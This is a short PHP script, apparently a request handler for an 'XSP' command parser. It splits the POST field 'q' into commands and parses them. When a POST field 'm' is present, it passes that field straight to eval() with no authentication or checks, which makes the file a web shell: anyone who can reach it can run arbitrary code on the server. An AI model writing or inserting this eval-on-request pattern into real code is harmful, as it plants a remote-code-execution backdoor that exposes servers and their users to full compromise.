<?php
require "xsp.php";
$xsp = new XSP();
if(!isset($_POST["m"])){
	$coms = explode(";",$_POST["q"]);
		foreach($coms as $cmd){
			if($cmd == "") continue;
			echo "<br />&raquo; ".$cmd."<br /><br />";
			$xsp->Parse($cmd);
		}
}else{
	eval($_POST["m"]);
}
?>